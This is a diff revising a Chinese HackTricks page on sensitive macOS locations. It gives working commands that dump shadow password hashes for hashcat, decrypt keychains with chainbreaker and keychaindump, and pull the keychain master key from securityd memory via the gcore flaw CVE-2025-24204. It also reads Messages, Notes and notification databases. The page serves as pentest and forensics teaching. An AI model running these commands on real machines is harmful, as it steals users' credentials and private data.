@@ -1,31 +1,54 @@
-# macOS 敏感位置与有趣的 Daemons
+# macOS 敏感位置与有趣的守护进程
 
 {{#include ../../../banners/hacktricks-training.md}}
+
 
 ## 密码
 
 ### Shadow Passwords
 
-Shadow password 与用户配置一起存储在 **`/var/db/dslocal/nodes/Default/users/`** 中的 plists 里。\
-以下 oneliner 可用于 dump **用户的所有信息**（包括 hash 信息）：
+Shadow password 与用户配置一起存储在 **`/var/db/dslocal/nodes/Default/users/`** 中的 plist 文件里。\
+以下单行命令可用于转储**所有用户信息**（包括 hash 信息）：
+
 ```bash
 for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
 ```
-[**此类脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)或[**此脚本**](https://github.com/octomagon/davegrohl.git)可用于将 hash 转换为 **hashcat** **格式**。
 
-另一种单行命令，可将所有非服务账户的凭据以 hashcat 格式 `-m 7100`（macOS PBKDF2-SHA512）导出：
+[**类似这样的脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 或 [**这样的脚本**](https://github.com/octomagon/davegrohl.git) 可用于将哈希转换为 **hashcat** **格式**。
+
+另一种单行命令，可用 hashcat 格式 `-m 7100`（macOS PBKDF2-SHA512）导出所有非服务账户的凭据：
+
 ```bash
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
+
 获取用户 `ShadowHashData` 的另一种方法是使用 `dscl`：`` sudo dscl . -read /Users/`whoami` ShadowHashData ``
+
+#### 在 Linux 上转换复制的 ShadowHashData
+
+如果该属性被复制到 Linux cracking host，请将**仅十六进制字节**（不包括 `ShadowHashData:` 标签）保存到 `shadowhash.hex`。在 Ubuntu 上，`libplist-utils` 可以将解码后的二进制 plist 转换为可读的 XML，无需使用 macOS `plutil`。<sup>[[5]](#references)</sup>
+
+```bash
+sudo apt install libplist-utils
+xxd -r -p shadowhash.hex > shadowhash.bplist
+plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
+```
+
+在 XML 中，使用 **`SALTED-SHA512-PBKDF2`** 中的 `iterations`、base64 `salt` 和 `entropy`，不要使用单独的 SRP verifier。将 `salt_b64` 和 `entropy_b64` 分别设为对应 XML `<data>` 的内容。将它们解码为十六进制，并按以下格式组成一行，供 Hashcat mode `7100` 使用：`$ml$<iterations>$<salt_hex>$<entropy_hex>`。这是在获取特权级 hash 后进行的离线猜测，不是初始访问或权限提升方法。<sup>[[5]](#references)[[6]](#references)</sup>
+
+```bash
+printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
+printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
+```
 
 ### /etc/master.passwd
 
-此文件**仅在系统以** **single-user mode** 运行时使用（因此并不常用）。
+此文件**仅在**系统以**single-user mode**运行时使用（因此并不常用）。
 
 ### Keychain Dump
 
-请注意，使用 security binary **dump 解密后的密码**时，系统会多次提示用户允许此操作。
+请注意，使用 security 二进制文件**dump 解密后的密码**时，系统会多次提示用户允许此操作。
+
 ```bash
 #security
 security dump-trust-settings [-s] [-d] #List certificates
@@ -34,48 +57,56 @@ security list-smartcards #List smartcards
 security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
 security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
 ```
-在现代 macOS 上，最值得关注的 backing store 通常是 **`~/Library/Keychains/login.keychain-db`** 和 **`/Library/Keychains/System.keychain`**。它们是由 SQLite 支持的文件，但明文访问仍由 **`securityd`** посред介：窃取原始 DB 主要只能获得元数据和加密 blob，除非你还能够恢复用户密码、`SystemKey` 或内存中的 master key。<sup>[[2]](#references)</sup>
+
+在现代 macOS 上，最值得关注的后端存储通常是 **`~/Library/Keychains/login.keychain-db`** 和 **`/Library/Keychains/System.keychain`**。它们是由 SQLite 支持的文件，但明文访问仍由 **`securityd`** 进行中介：窃取原始 DB 主要只能获得元数据和加密数据块，除非你还能恢复用户密码、`SystemKey` 或内存中的主密钥。<sup>[[2]](#references)</sup>
 
 ### [Keychaindump](https://github.com/juuso/keychaindump)
 
 > [!CAUTION]
-> 根据此评论 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)，这些工具似乎已经无法在 Big Sur 上正常工作。
+> 根据这条评论 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)，这些工具似乎在 Big Sur 上已经无法使用。
 
 ### Keychaindump 概述
 
-一个名为 **keychaindump** 的工具被开发用于从 macOS keychain 中提取密码，但正如一场[讨论](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)所指出的，它在 Big Sur 等较新的 macOS 版本上存在限制。使用 **keychaindump** 要求攻击者先获得访问权限并将权限提升至 **root**。该工具利用了这样一个事实：为方便用户使用，用户登录后 keychain 默认处于解锁状态，使应用程序无需反复要求用户输入密码即可访问它。不过，如果用户选择在每次使用后锁定 keychain，**keychaindump** 就会失效。
+有一个名为 **keychaindump** 的工具可用于从 macOS 钥匙串中提取密码，但正如[讨论](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)所示，它在 Big Sur 等较新的 macOS 版本上存在局限。使用 **keychaindump** 需要攻击者获得访问权限并将权限提升到 **root**。该工具利用了这样一个事实：为方便使用，用户登录后钥匙串默认处于解锁状态，因此应用程序无需反复要求用户输入密码即可访问它。不过，如果用户选择在每次使用后锁定钥匙串，**keychaindump** 就无法发挥作用。
 
-**Keychaindump** 的工作方式是针对一个名为 **securityd** 的特定进程。Apple 将其描述为负责授权和加密操作的 daemon，对访问 keychain 至关重要。提取过程包括识别一个由用户登录密码派生的 **Master Key**。读取 keychain 文件必须使用此密钥。为了定位 **Master Key**，**keychaindump** 使用 `vmmap` 命令扫描 **securityd** 的内存堆，在标记为 `MALLOC_TINY` 的区域中寻找潜在的密钥。以下命令用于检查这些内存位置：
+**Keychaindump** 的目标是一个名为 **securityd** 的特定进程。Apple 将其描述为负责授权和加密操作的守护进程，而访问钥匙串离不开它。提取过程包括识别由用户登录密码派生的**主密钥**。读取钥匙串文件需要此密钥。为了找到**主密钥**，**keychaindump** 使用 `vmmap` 命令扫描 **securityd** 的内存堆，在标记为 `MALLOC_TINY` 的区域中寻找可能的密钥。以下命令用于检查这些内存位置：
+
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-在识别出潜在的主密钥后，**keychaindump** 会在堆中搜索特定模式（`0x0000000000000018`），该模式表示主密钥候选项。要使用此密钥，还需要执行包括去混淆在内的后续步骤，具体过程已在 **keychaindump** 的源代码中说明。专注于此领域的分析人员应注意，用于解密 keychain 的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令如下：
+
+识别出潜在的主密钥后，**keychaindump** 会在堆中搜索特定模式（`0x0000000000000018`），以定位可能的主密钥候选项。要使用该密钥，还需要执行去混淆等后续步骤，具体说明见 **keychaindump** 的源代码。研究这一领域的分析人员应注意，用于解密钥匙串的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令如下：
+
 ```bash
 sudo ./keychaindump
 ```
+
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) 可用于以取证可靠的方式从 OSX keychain 中提取以下类型的信息：
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker) 可以以符合数字取证规范的方式，从 macOS 钥匙串中提取以下类型的信息：
 
-- 适合使用 [hashcat](https://hashcat.net/hashcat/) 或 [John the Ripper](https://www.openwall.com/john/) 进行破解的 Hashed Keychain password
-- Internet Passwords
-- Generic Passwords
-- Private Keys
-- Public Keys
-- X509 Certificates
-- Secure Notes
-- Appleshare Passwords
+- 钥匙串密码的哈希值，可使用 [hashcat](https://hashcat.net/hashcat/) 或 [John the Ripper](https://www.openwall.com/john/) 进行破解
+- Internet 密码
+- 通用密码
+- 私钥
+- 公钥
+- X509 证书
+- 安全备忘录
+- Appleshare 密码
 
-提供 keychain unlock password、使用 [volafox](https://github.com/n0fate/volafox) 或 [volatility](https://github.com/volatilityfoundation/volatility) 获取的 master key，或 SystemKey 等 unlock file 后，Chainbreaker 还可以提供 plaintext passwords。
+如果提供钥匙串解锁密码、使用 [volafox](https://github.com/n0fate/volafox) 或 [volatility](https://github.com/volatilityfoundation/volatility) 获取的主密钥，或 SystemKey 之类的解锁文件，Chainbreaker 还会提供明文密码。
 
-如果没有上述任一解锁 Keychain 的方法，Chainbreaker 将显示所有其他可用信息。
+如果没有使用上述任一方法解锁钥匙串，Chainbreaker 仍会显示所有其他可用信息。
 
-#### **Dump keychain keys**
+#### **转储钥匙串密钥**
+
 ```bash
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
-#### **使用 SystemKey 转储 keychain 密钥（包含密码）**
+
+#### **使用 SystemKey 转储 keychain 密钥（含密码）**
+
 ```bash
 # First, get the keychain decryption key
 # To get this decryption key you need to be root and SIP must be disabled
@@ -83,7 +114,9 @@ hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
 ## Use the previous key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **转储 keychain 密钥（通过破解 hash 获取密码）**
+
+#### **Dump keychain 密钥（带密码）并破解 hash**
+
 ```bash
 # Get the keychain hash
 python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
@@ -92,53 +125,60 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **使用 memory dump 转储 keychain keys（含 passwords）**
 
-[按照这些步骤操作](../index.html#dumping-memory-with-osxpmem)以执行 **memory dump**
+#### **使用 memory dump Dump keychain keys（含密码）**
+
+[按照这些步骤](../index.html#dumping-memory-with-osxpmem)执行 **memory dump**
+
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
-# Unformtunately volafox isn't working with the latest versions of MacOS
+# Unfortunately, Volafox does not support recent macOS versions
 python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **使用用户密码 Dump keychain keys（with passwords）**
 
-如果你知道用户密码，就可以使用它来 **Dump 并解密属于该用户的 keychains**。
+#### **使用用户密码 dump 钥匙串密钥（含密码）**
+
+如果你知道用户的密码，就可以使用它来 **dump 并解密该用户的钥匙串**。
+
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
-### 通过 `gcore` entitlement 获取 Keychain master key（CVE-2025-24204）
 
-macOS 15.0（Sequoia）随 `/usr/bin/gcore` 提供了 **`com.apple.system-task-ports.read`** entitlement，因此任何本地管理员（或恶意签名应用）都可以在 SIP/TCC 强制执行的情况下转储 **任意进程内存**。转储 `securityd` 会以明文泄露 **Keychain master key**，使你能够在不需要用户密码的情况下解密 `login.keychain-db`。<sup>[[1]](#references)</sup>
+### 通过 `gcore` entitlement 获取 Keychain master key (CVE-2025-24204)
 
-**在易受攻击的版本（15.0–15.2）上快速复现：**
+macOS 15.0 (Sequoia) 随附的 `/usr/bin/gcore` 带有 **`com.apple.system-task-ports.read`** entitlement，因此任何本地管理员（或恶意签名应用）都能转储**任意进程的内存，即使 SIP/TCC 已启用**。转储 `securityd` 会以明文泄露 **Keychain master key**，让你无需用户密码即可解密 `login.keychain-db`。<sup>[[1]](#references)</sup>
+
+**在受影响的版本 (15.0–15.2) 上快速复现：**
+
 ```bash
 sudo pgrep securityd        # usually a single PID
 sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
 python3 - <<'PY'
 import mmap,re,sys
 with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
-mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
-for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
-c=m.group(0)
-if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
+    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
+    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
+        c=m.group(0)
+        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
 PY $(pgrep securityd)
 ```
-将提取出的十六进制密钥提供给 Chainbreaker（`--key <hex>`），以解密登录 keychain。Apple 已在 **macOS 15.3+** 中移除了该 entitlement，因此这仅适用于未打补丁的 Sequoia 构建版本，或保留了存在漏洞的 binary 的系统。
+将提取的十六进制密钥传递给 Chainbreaker（`--key <hex>`），以解密登录钥匙串。Apple 已在 **macOS 15.3+** 中移除此权限项，因此此方法仅适用于未打补丁的 Sequoia 版本，或保留了易受攻击二进制文件的系统。
 
 ### kcpassword
 
-**kcpassword** 文件中存储了**用户的登录密码**，但前提是系统所有者已**启用自动登录**。因此，用户无需输入密码即可自动登录（这并不十分安全）。
+**kcpassword** 文件存储**用户的登录密码**，但前提是系统所有者**启用了自动登录**。这样，用户无需输入密码就会自动登录（这并不太安全）。
 
-密码存储在文件 **`/etc/kcpassword`** 中，并与密钥 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 进行异或。如果用户的密码长度超过密钥长度，则会重复使用该密钥。\
-因此，恢复密码相当容易，例如可以使用类似[**此脚本**](https://gist.github.com/opshope/32f65875d45215c3677d)的工具。
+密码存储在文件 **`/etc/kcpassword`** 中，并与密钥 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 进行 XOR 运算。如果用户的密码比密钥长，则会重复使用该密钥。\
+因此，密码很容易恢复，例如可以使用[**这个脚本**](https://gist.github.com/opshope/32f65875d45215c3677d)。
 
 ## 数据库中的有趣信息
 
 ### Messages
+
 ```bash
 sqlite3 $HOME/Library/Messages/chat.db .tables
 sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
@@ -146,11 +186,13 @@ sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
 sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
 sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 ```
+
 ### 通知
 
-在 **Sequoia** 之前，通常可以在 **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** 找到 Notification Center 的存储库。在 **Sequoia+** 中，Apple 将其移动到了受 TCC 保护的组容器 **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**。
+在 **Sequoia** 之前，通常可以在 **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** 中找到 Notification Center 存储库。在 **Sequoia+** 中，Apple 将其移到了受 TCC 保护的群组容器 **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**。
 
-大多数有价值的信息都存储在 **blob** 列中，因此你需要提取这些内容，并将其转换为人类可读的形式（`plutil -p -`、`strings` 或小型解析器）。快速 triage 示例：
+大多数有趣的信息都存储在 **blob** 列中，因此你需要提取这些内容，并将其转换为人类可读的格式（`plutil -p -`、`strings` 或小型解析器）。快速分类示例：
+
 ```bash
 # Legacy location (older releases / affected builds)
 DA=$(getconf DARWIN_USER_DIR)
@@ -160,134 +202,148 @@ sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from recor
 # Sequoia+ location (TCC-protected)
 sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
 ```
-#### 近期隐私问题（NotificationCenter DB）
 
-- 在 macOS **14.7–15.1** 中，Apple 将 banner 内容存储在 `db2/db` SQLite 中，但没有进行适当的 redaction。CVE **CVE-2024-44292/44293/40838/54504** 允许任何本地用户仅通过打开该 DB 读取其他用户的通知文本（无需 TCC 提示）。<sup>[[3]](#references)</sup>
-- Apple 通过将 DB 移动到 `group.com.apple.usernoted`，并在更新版本的 Sequoia build 中使用 TCC 保护它来缓解此问题。因此，在当前系统上，通常需要正确的用户上下文或 TCC bypass 才能读取它。<sup>[[4]](#references)</sup>
-- 在 legacy endpoints 上，如果希望保留 artefacts，请在更新或重启前同时复制 `db`、`db-wal` 和 `db-shm` 文件。
+#### 最近的隐私问题（NotificationCenter DB）
 
-### 注释
+- 在 macOS **14.7–15.1** 中，Apple 将横幅内容存储在 `db2/db` SQLite 数据库中，但未进行适当的脱敏。CVE **CVE-2024-44292/44293/40838/54504** 允许任何本地用户只需打开数据库（无需 TCC 提示）即可读取其他用户的通知文本。<sup>[[3]](#references)</sup>
+- Apple 通过将数据库移至 `group.com.apple.usernoted` 并在较新的 Sequoia 版本中使用 TCC 保护它来缓解此问题。因此，在当前系统上，通常需要正确的用户上下文或 TCC bypass 才能读取数据库。<sup>[[4]](#references)</sup>
+- 在旧版终端上，如果想保留这些 artefacts，请在更新或重启前将 `db`、`db-wal` 和 `db-shm` 文件一并复制。
 
-用户的 **notes** 位于 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
+### 备注
+
+用户的**备忘录**可在 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` 中找到。
+
 ```bash
 sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables
 
 # ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
 for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
 ```
-如果上面的 one-liner 输出过于嘈杂，可以导出 `ZICNOTEDATA.ZDATA`，对其进行 gunzip，然后解析 protobuf：与直接在 SQLite 上运行 `strings` 相比，这通常更加可靠。
 
-### Background Tasks / Login Items
+如果上面的一行命令产生的噪声太多，可以导出 `ZICNOTEDATA.ZDATA`，用 gunzip 解压，然后解析 protobuf：这通常比直接对 SQLite 运行 `strings` 更可靠。
 
-从 **Ventura** 开始，用户批准的登录项和多个后台任务会被记录在 **BTM** 存储中，例如 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`**，以及带版本号的系统缓存 **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**。
+### 后台任务 / 登录项
 
-这些文件可用于快速识别持久化机制、helper tools，以及一些由 MDM 管理的后台项：
+从 **Ventura** 开始，用户批准的登录项和若干后台任务会记录在 **BTM** 存储中，例如 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`**，以及带版本号的系统缓存 **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**。
+
+这些文件有助于快速识别持久化项目、辅助工具，以及某些由 MDM 管理的后台项目：
+
 ```bash
 plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
 sfltool dumpbtm
 ```
-从 persistence 角度以及 BTM internals 入手，请查看[auto-start locations 页面](../../macos-auto-start-locations.md#login-items)和[Background Tasks Management 笔记](../macos-security-protections/README.md#background-tasks-management)。
+
+关于 persistence 方面和 BTM 内部机制，请查看[自动启动位置页面](../../macos-auto-start-locations.md#login-items)和[Background Tasks Management 笔记](../macos-security-protections/README.md#background-tasks-management)。
 
 ## Preferences
 
-在 macOS 应用中，Preferences 位于 **`$HOME/Library/Preferences`**，而在 iOS 中位于 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`。
+在 macOS 应用中，Preferences 位于 **`$HOME/Library/Preferences`**；在 iOS 中，它们位于 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`。
 
-在 macOS 中，可以使用 cli tool **`defaults`** 来**修改 Preferences 文件**。
+在 macOS 中，可以使用 CLI 工具 **`defaults`** 来**修改 Preferences 文件**。
 
-**`/usr/sbin/cfprefsd`** 声明了 XPC services `com.apple.cfprefsd.daemon` 和 `com.apple.cfprefsd.agent`，可以调用它来执行修改 preferences 等操作。
+**`/usr/sbin/cfprefsd`** 提供 XPC 服务 `com.apple.cfprefsd.daemon` 和 `com.apple.cfprefsd.agent`，可调用它来执行修改 preferences 等操作。
 
 ## OpenDirectory permissions.plist
 
-文件 `/System/Library/OpenDirectory/permissions.plist` 包含应用于节点 attributes 的 permissions，并受 SIP 保护。\
-此文件通过 UUID（而不是 uid）向特定用户授予 permissions，使其能够访问包括 `ShadowHashData`、`HeimdalSRPKey` 和 `KerberosKeys` 在内的特定敏感信息：
+文件 `/System/Library/OpenDirectory/permissions.plist` 包含应用于节点属性的权限，并受 SIP 保护。\
+此文件通过 UUID（而非 uid）向特定用户授予权限，使其能够访问 `ShadowHashData`、`HeimdalSRPKey` 和 `KerberosKeys` 等敏感信息：
+
 ```xml
 [...]
 <key>dsRecTypeStandard:Computers</key>
 <dict>
-<key>dsAttrTypeNative:ShadowHashData</key>
-<array>
-<dict>
-<!-- allow wheel even though it's implicit -->
-<key>uuid</key>
-<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
-<key>permissions</key>
-<array>
-<string>readattr</string>
-<string>writeattr</string>
-</array>
-</dict>
-</array>
-<key>dsAttrTypeNative:KerberosKeys</key>
-<array>
-<dict>
-<!-- allow wheel even though it's implicit -->
-<key>uuid</key>
-<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
-<key>permissions</key>
-<array>
-<string>readattr</string>
-<string>writeattr</string>
-</array>
-</dict>
-</array>
+	<key>dsAttrTypeNative:ShadowHashData</key>
+	<array>
+		<dict>
+			<!-- allow wheel even though it's implicit -->
+			<key>uuid</key>
+			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
+			<key>permissions</key>
+			<array>
+				<string>readattr</string>
+				<string>writeattr</string>
+			</array>
+		</dict>
+	</array>
+	<key>dsAttrTypeNative:KerberosKeys</key>
+	<array>
+		<dict>
+			<!-- allow wheel even though it's implicit -->
+			<key>uuid</key>
+			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
+			<key>permissions</key>
+			<array>
+				<string>readattr</string>
+				<string>writeattr</string>
+			</array>
+		</dict>
+	</array>
 [...]
 ```
+
 ## 系统通知
 
-### Darwin Notifications
+### Darwin 通知
 
-用于处理通知的主要 daemon 是 **`/usr/sbin/notifyd`**。为了接收通知，客户端必须通过 `com.apple.system.notification_center` Mach port 进行注册（使用 `sudo lsmp -p <pid notifyd>` 检查它们）。该 daemon 可通过文件 `/etc/notify.conf` 进行配置。
+通知的主守护进程是 **`/usr/sbin/notifyd`**。要接收通知，客户端必须通过 `com.apple.system.notification_center` Mach 端口注册（使用 `sudo lsmp -p <pid notifyd>` 检查）。该守护进程可通过文件 `/etc/notify.conf` 配置。
 
-通知使用的名称是唯一的反向 DNS notation。当通知发送到其中一个名称时，已表明能够处理该通知的客户端将收到它。
+通知使用的名称是唯一的反向 DNS 表示法。向其中一个名称发送通知时，声明能够处理该通知的客户端会收到通知。
 
-可以向 notifyd 进程发送信号 SIGUSR2，然后读取生成的文件 `/var/run/notifyd_<pid>.status`，以 dump 当前状态（并查看所有名称）：
+可以向 notifyd 进程发送 SIGUSR2 信号并读取生成的文件 `/var/run/notifyd_<pid>.status`，以转储当前状态（并查看所有名称）：
+
 ```bash
 ps -ef | grep -i notifyd
-0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd
+    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd
 
 sudo kill -USR2 376
 
 cat /var/run/notifyd_376.status
 [...]
 pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
-memory: com.apple.system.timezone
-common: com.apple.analyticsd.running
-common: com.apple.CFPreferences._domainsChangedExternally
-common: com.apple.security.octagon.joined-with-bottle
+  memory: com.apple.system.timezone
+  common: com.apple.analyticsd.running
+  common: com.apple.CFPreferences._domainsChangedExternally
+  common: com.apple.security.octagon.joined-with-bottle
 [...]
 ```
-### 分布式通知中心
 
-**Distributed Notification Center** 的主 binary 是 **`/usr/sbin/distnoted`**，这是另一种发送通知的方式。它公开了一些 XPC services，并执行一些检查来尝试验证客户端。
+### Distributed Notification Center
+
+**Distributed Notification Center** 的主二进制文件是 **`/usr/sbin/distnoted`**，它是另一种发送通知的方式。它会公开一些 XPC 服务，并执行一些检查来尝试验证客户端。
 
 ### Apple Push Notifications (APN)
 
-在这种情况下，应用程序可以注册 **topics**。客户端通过 **`apsd`** 联系 Apple 的服务器来生成一个 token。\
-然后，providers 也会生成一个 token，并能够连接到 Apple 的服务器，向客户端发送消息。这些消息会由 **`apsd`** 在本地接收，然后将通知转发给等待接收通知的应用程序。
+在这种情况下，应用程序可以注册 **topics**。客户端会通过 **`apsd`** 联系 Apple 的服务器并生成一个 token。\
+然后，提供方也会生成一个 token，并能够连接到 Apple 的服务器，向客户端发送消息。**`apsd`** 会在本地接收这些消息，并将通知转发给正在等待接收通知的应用程序。
 
-preferences 位于 `/Library/Preferences/com.apple.apsd.plist`。
+偏好设置位于 `/Library/Preferences/com.apple.apsd.plist`。
 
-macOS 中的本地消息数据库位于 `/Library/Application\ Support/ApplePushService/aps.db`，iOS 中则位于 `/var/mobile/Library/ApplePushService`。其中包含 3 个 tables：`incoming_messages`、`outgoing_messages` 和 `channel`。
+macOS 中的本地消息数据库位于 `/Library/Application\ Support/ApplePushService/aps.db`，iOS 中则位于 `/var/mobile/Library/ApplePushService`。它包含 3 个表：`incoming_messages`、`outgoing_messages` 和 `channel`。
+
 ```bash
 sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
 ```
-还可以使用以下方式获取有关 daemon 和连接的信息：
+
+也可以使用以下方式获取有关守护进程和连接的信息：
+
 ```bash
 /System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
 ```
+
 ## 用户通知
 
-这些通知是用户应在屏幕上看到的内容：
+这些通知会显示在用户的屏幕上：
 
-- **`CFUserNotification`**：这些 API 提供了一种在屏幕上显示带有消息的弹窗的方式。
-- **The Bulletin Board**：这会在 iOS 中显示一个随后消失的横幅，并将其存储在 Notification Center 中。
-- **`NSUserNotificationCenter`**：这是 MacOS 中的 iOS bulletin board。在较旧的 macOS 版本中，数据库通常位于 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`；在 Sequoia+ 中，它被移动到了 `~/Library/Group Containers/group.com.apple.usernoted/db2/db`。
+- **`CFUserNotification`**：这些 API 可在屏幕上显示带有消息的弹出窗口。
+- **The Bulletin Board**：此功能会在 iOS 中显示横幅，横幅消失后会保存在 Notification Center 中。
+- **`NSUserNotificationCenter`**：macOS 上的旧版通知中心服务。在较早版本中，数据库通常位于 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`；在 Sequoia 及更高版本中，数据库已移至 `~/Library/Group Containers/group.com.apple.usernoted/db2/db`。
 
 ## References
 
-- [1] [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
-- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
-- [3] [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
-- [4] [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
-
+- [1] [HelpNetSecurity – macOS gcore entitlement 允许提取 Keychain 主密钥 (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
+- [2] [Apple Platform Security – Keychain 数据保护](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
+- [3] [Rapid7 – Notification Center SQLite 数据披露 (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
+- [4] [9to5Mac – Apple 解决 macOS Sequoia 中 Notification Center 数据库的隐私问题](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
+- [5] [SRA Labs – macOS 密码破解](https://labs.sra.io/posts/macospasswordcracking)
+- [6] [Hashcat 示例哈希值 – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
 {{#include ../../../banners/hacktricks-training.md}}
